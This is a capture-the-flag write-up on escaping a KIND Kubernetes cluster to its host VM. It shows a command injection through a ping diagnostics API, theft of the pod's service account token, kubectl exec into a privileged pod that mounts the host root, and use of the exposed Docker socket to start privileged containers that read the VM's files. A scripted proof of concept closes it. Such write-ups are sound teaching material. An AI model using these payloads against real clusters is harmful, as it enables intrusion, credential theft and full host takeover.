# Vulnerability

1. Excessive access for a service account attached to backend pod, so with extracted token from it, access to cluster can be established with connecting to API server directly. 
2. mounting root of host ( container ) to /host of pod, which results in containing docker.sock in pod file system which we can access it using service account token. 

# Extraction

## Concept explanation

In a normal k8s cluster the hierarchy of elements is like this:

VM ( cluster node ) - Pod - container

but in KIND implementation we go one step deeper:

VM - docker Engine - docker container ( cluster node ) - pods - containers

So if we want to access the VM we should pass one more level. from past parts I have learned how to bypass kubectl and connect to API server and for instance get the list of pods and ...

## what has been done

1. First connected to api server of k8s and got the pods list with this command:
```
google.com; curl -sk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://10.96.0.1/api/v1/pods￼
```

* 10.96.0.1 is the Kubernetes API server's internal IP, reachable from any pod in the cluster by default

and got this result:
```
$ ping -c 2 google.com; curl -sk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://10.96.0.1/api/v1/pods
{
  "kind": "PodList",
  "apiVersion": "v1",
  "metadata": {
    "resourceVersion": "387906"
  },
  "items": [
    {
      "metadata": {
        "name": "legacy-worker",
        "namespace": "escape-zone",
        "uid": "f4354bd1-27f5-41fc-b4b1-e76392a5be92",
        "resourceVersion": "8057",
        "creationTimestamp": "2026-08-19T15:27:58Z",
        "labels": {
          "app": "legacy-worker"
        },
        "annotations": {
          "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"labels\":{\"app\":\"legacy-worker\"},\"name\":\"legacy-worker\",\"namespace\":\"escape-zone\"},\"spec\":{\"automountServiceAccountToken\":false,\"containers\":[{\"command\":[\"sh\",\"-c\",\"sleep infinity\"],\"image\":\"ctf/escape-zone:latest\",\"imagePullPolicy\":\"IfNotPresent\",\"name\":\"legacy-worker\",\"resources\":{\"limits\":{\"cpu\":\"100m\",\"memory\":\"64Mi\"},\"requests\":{\"cpu\":\"50m\",\"memory\":\"32Mi\"}},\"securityContext\":{\"privileged\":true},\"volumeMounts\":[{\"mountPath\":\"/host\",\"name\":\"host-root\"}]}],\"initContainers\":[{\"command\":[\"sh\",\"-c\",\"mkdir -p /host/var/lib/node-data \\u0026\\u0026 echo \\\"FLAG\\\" \\u003e /host/var/lib/node-data/flag.txt\"],\"image\":\"ctf/escape-zone:latest\",\"imagePullPolicy\":\"IfNotPresent\",\"name\":\"place-flag\",\"resources\":{\"limits\":{\"cpu\":\"100m\",\"memory\":\"64Mi\"},\"requests\":{\"cpu\":\"50m\",\"memory\":\"32Mi\"}},\"securityContext\":{\"privileged\":true},\"volumeMounts\":[{\"mountPath\":\"/host\",\"name\":\"host-root\"}]}],\"nodeName\":\"ctf-worker2\",\"volumes\":[{\"hostPath\":{\"path\":\"/\",\"type\":\"Directory\"},\"name\":\"host-root\"}]}}\n"
        },
```

This was the first pod shown in the list and shows that the pod is priviledge ( {"privileged":true} ) and mounted / of host into its /host. here the pods host is not VM ( in normal cluster it is ) but the host here is container (node). So we may have access to docker socket which can make us connected to docker daemon. This will enable us to create a new container and mount its host's root ( which will be the VM's root ) to container's root and with that we will have access to VM's file system.

2. So tried to find the docker.sock inside it because the file system of docker container is mounted inside it. brute forced some directories and finally using this command:

```
google.com; kubectl exec -n escape-zone legacy-worker --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) --server=https://10.96.0.1 --insecure-skip-tls-verify -- ls -la /host/run/docker.sock
```

* -n escape-zone : target namespace
* --token=... : authenticate using service account token instead of a normal kubeconfig
* --server=https://10.96.0.1 : point kubectl directly at the API server's internal address
* --insecure-skip-tls-verify : same reason as curl's -k
* -- ls -la /host/run/docker.sock : the actual command to run inside the pod, after the -- separator

and found it :

```
$ ping -c 2 google.com; kubectl exec -n escape-zone legacy-worker --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) --server=https://10.96.0.1 --insecure-skip-tls-verify -- ls -la /host/run/docker.sock
srw-rw----    1 root     988              0 Aug 19 13:31 /host/run/docker.sock
```

now for testing the docker daemon used this command to get the list of containers:

```
google.com; kubectl exec -n escape-zone legacy-worker \
  --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) \
  --server=https://10.96.0.1 \
  --insecure-skip-tls-verify \
  -- curl --unix-socket /host/run/docker.sock http://localhost/containers/json
```

* I used exec into legacy-worker because I could use the docker.sock inside its file system. I could communicate with the VM's Docker daemon through that socket and send Docker API requests.
* --unix-socket /host/run/docker.sock tells curl to speak HTTP over a Unix domain socket instead of TCP/IP. the Docker API is just an HTTP REST API. it happens to be exposed over a socket file rather than a network port for security reasons (only local processes can normally reach it).

and found out 3 containers (ctf-worker2, ctf-worker, ctf-control-plane) and also find out that the docker daemon is on vm and can control the docker engine which KIND nodes are inside it. now to access the file system of VM I can create a new container and mount the / of its host ( which is vm ) into its /hosts and with that we can access to vm file system with creating a CMD for the new container, so that it executes it just after running.

**note: unlike using docker client that using docker run container both gets created and started, when using docker API we must do both of them**

So I created a new container with this command :

```
google.com; kubectl exec -n escape-zone legacy-worker \
  --token="$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  --server=https://10.96.0.1 \
  --insecure-skip-tls-verify \
  -- curl --unix-socket /host/run/docker.sock \
  -X POST http://localhost/containers/create \
  -H 'Content-Type: application/json' \
  -d '{
    "Image":"hub.hamdocker.ir/alpine:3.19",
    "Cmd":["find","/host","-type","f","-iname","*flag*"],
    "HostConfig":{
      "Binds":["/:/host"],
      "Privileged":true
    }
  }'
```

* "Image": which image to base the container on. I decided to use one already present on the host ( so that this method works even if the access of VM to internet is broken ) so used this command to get all present images:

```
google.com; kubectl exec -n escape-zone legacy-worker \
  --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) \
  --server=https://10.96.0.1 \
  --insecure-skip-tls-verify \
  -- curl --unix-socket /host/run/docker.sock http://localhost/images/json
```

and got this image `hub.hamdocker.ir/alpine:3.19` in results.

* "Cmd": the command to run as the container's entrypoint
* "HostConfig"."Binds": ["/:/host"]: bind-mount the host's root filesystem (/) into the new container at /host. Since Docker is creating this container on the real VM, "/" here means the VM's actual root, not any nested container's root.
* "Privileged": true: grants the container extended kernel capabilities. not strictly required but ensures no permission edge cases block reading the mount.

and started it:

```
google.com; kubectl exec -n escape-zone legacy-worker \
  --token="$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  --server=https://10.96.0.1 \
  --insecure-skip-tls-verify \
  -- curl --unix-socket /host/run/docker.sock \
  -X POST http://localhost/containers/<CONTAINER_ID>/start
```

and now we should check the logs of container to see the output of `find` executed using CMD inside the container:
```
google.com; kubectl exec -n escape-zone legacy-worker \
  --token="$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  --server=https://10.96.0.1 \
  --insecure-skip-tls-verify \
  -- curl --unix-socket /host/run/docker.sock \
  "http://localhost/containers/<CONTAINER_ID>/logs?stdout=true&stderr=true"
```

the log had this line `/host/home/ubuntu/flag.txt`

so for reading it, I decided to create a new container with a CMD that `cat`s the flag.txt :
```terminal
google.com; kubectl exec -n escape-zone legacy-worker \
  --token="$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  --server=https://10.96.0.1 \
  --insecure-skip-tls-verify \
  -- curl --unix-socket /host/run/docker.sock \
  -X POST http://localhost/containers/create \
  -H 'Content-Type: application/json' \
  -d '{
    "Image":"hub.hamdocker.ir/alpine:3.19",
    "Cmd":["cat","/host/home/ubuntu/flag.txt"],
    "HostConfig":{
      "Binds":["/:/host"],
      "Privileged":true
    }
  }'
```

Started like last time and this is the logs output:
```
$ ping -c 2 google.com; kubectl exec -n escape-zone legacy-worker \   --token="$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \   --server=https://10.96.0.1 \   --insecure-skip-tls-verify \   -- curl --unix-socket /host/run/docker.sock \   "http://localhost/containers/53c92e082ca5a3b48b07a4f619efc6d7e65d10ffd2eca7ffde7079aa47230fe5/logs?stdout=true&stderr=true"
FLAG_FOUND_IN_RESULTS
```

final flag is found. 

# PoC

```
CONTAINER_ID=$(curl -s -X 'POST' \
  'https://ctf.seoeh.ir/api/diag/ping' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{"host":"google.com; kubectl exec -n escape-zone legacy-worker \\   --token=\"$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" \\   --server=https://10.96.0.1 \\   --insecure-skip-tls-verify \\   -- curl --unix-socket /host/run/docker.sock \\   -X POST http://localhost/containers/create \\   -H '\''Content-Type: application/json'\'' \\   -d '\''{     \"Image\":\"hub.hamdocker.ir/alpine:3.19\",     \"Cmd\":[\"cat\",\"/host/home/ubuntu/flag.txt\"],     \"HostConfig\":{       \"Binds\":[\"/:/host\"],       \"Privileged\":true     }   }'\''"}' | jq -r '.output | fromjson | .Id')

curl -s -o /dev/null -X POST \
  'https://ctf.seoeh.ir/api/diag/ping' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  --data-binary @- <<JSON
{
  "host": "google.com; kubectl exec -n escape-zone legacy-worker --token=\"\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" --server=https://10.96.0.1 --insecure-skip-tls-verify -- curl --unix-socket /host/run/docker.sock -X POST http://localhost/containers/$CONTAINER_ID/start"
}
JSON

RESULT=$(curl -s -X POST \
  'https://ctf.seoeh.ir/api/diag/ping' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  --data-binary @- <<JSON
{
  "host": "google.com; kubectl exec -n escape-zone legacy-worker --token=\"\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" --server=https://10.96.0.1 --insecure-skip-tls-verify -- curl --unix-socket /host/run/docker.sock \"http://localhost/containers/$CONTAINER_ID/logs?stdout=true&stderr=true\""
}
JSON
)

echo "$RESULT" | grep -oP 'HAMAMOOZ{[^}]+\}'
```